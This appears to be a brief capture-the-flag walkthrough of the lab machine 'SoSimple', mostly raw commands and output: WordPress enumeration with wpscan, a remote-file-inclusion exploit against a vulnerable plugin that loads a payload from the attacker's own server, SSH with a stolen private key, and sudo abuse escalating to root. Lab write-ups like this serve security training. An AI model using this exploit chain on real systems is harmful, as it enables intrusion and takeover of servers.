参考资料：
 
[https://medium.com/@Inching-Towards-Intelligence/pg-play-sosimple-53-100-21453c1ef208](https://medium.com/@Inching-Towards-Intelligence/pg-play-sosimple-53-100-21453c1ef208)
    
[https://blog.csdn.net/weixin_46743202/article/details/128643986](https://blog.csdn.net/weixin_46743202/article/details/128643986)
      

[http://192.168.212.78/](http://192.168.212.78/)
   

[http://192.168.212.78/wordpress/wp-admin](http://192.168.212.78/wordpress/wp-admin)
   

wpscan --url [http://192.168.212.78/wordpress/](http://192.168.212.78/wordpress/) --enumerate vp,u,vt,tt
 
[http://192.168.212.78/wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s](http://192.168.212.78/wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s)
   

──(kali㉿kali)-[~/Desktop/pg02/SoSimple]  
└─$ wpscan --url [http://192.168.212.78/wordpress/](http://192.168.212.78/wordpress/) --enumerate vp,u,vt,tt
      

loudong  
[https://www.exploit-db.com/exploits/46794](https://www.exploit-db.com/exploits/46794)
   

[http://192.168.45.196:8080/payload.txt](http://192.168.45.196:8080/payload.txt)
   

[http://192.168.212.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.196:8080/payload.txt](http://192.168.212.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.196:8080/payload.txt)
   

cd /home/max/  
ls
 
www-data@so-simple:/home/max$ cat local.txt  
cat local.txt  
7b55e3bac3883c7df73b78672d714159  
www-data@so-simple:/home/max$
       
┌──(kali㉿kali)-[~/Desktop/pg02/SoSimple]  
└─$ ssh -i id_rsa max@192.168.212.78  
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)
 
- Documentation: [https://help.ubuntu.com](https://help.ubuntu.com)  
- Management: [https://landscape.canonical.com](https://landscape.canonical.com)  
- Support: [https://ubuntu.com/advantage](https://ubuntu.com/advantage)
 
System information as of Sat Nov 15 04:16:01 UTC 2025
 
System load: 0.0 Processes: 162  
Usage of /: 53.1% of 8.79GB Users logged in: 0  
Memory usage: 20% IPv4 address for docker0: 172.17.0.1  
Swap usage: 0% IPv4 address for ens160: 192.168.212.78
   

47 updates can be installed immediately.  
0 of these updates are security updates.  
To see these additional updates run: apt list --upgradable
   

The list of available updates is more than a week old.  
To check for new updates run: sudo apt update  
Failed to connect to [https://changelogs.ubuntu.com/meta-release-lts](https://changelogs.ubuntu.com/meta-release-lts). Check your Internet connection or proxy settings
   

Last login: Sat Nov 15 04:14:11 2025 from 192.168.45.196  
max@so-simple:~$  
max@so-simple:~$  
max@so-simple:~$ sudo -u steven service ../../bin/sh  
$ python3 -c 'import pty;pty.spawn("/bin/bash")'  
steven@so-simple:/$ cd /opt/  
steven@so-simple:/opt$ sudo /opt/tools/server-health.sh  
root@so-simple:/opt# whoami  
root  
root@so-simple:/opt# cd /root  
root@so-simple:~# ls  
flag.txt proof.txt snap  
root@so-simple:~# cat flag.txt  
This is not the flag you're looking for...  
root@so-simple:~# cat proof.txt  
539d61f78d012f1807ae2c713008fce0  
root@so-simple:~#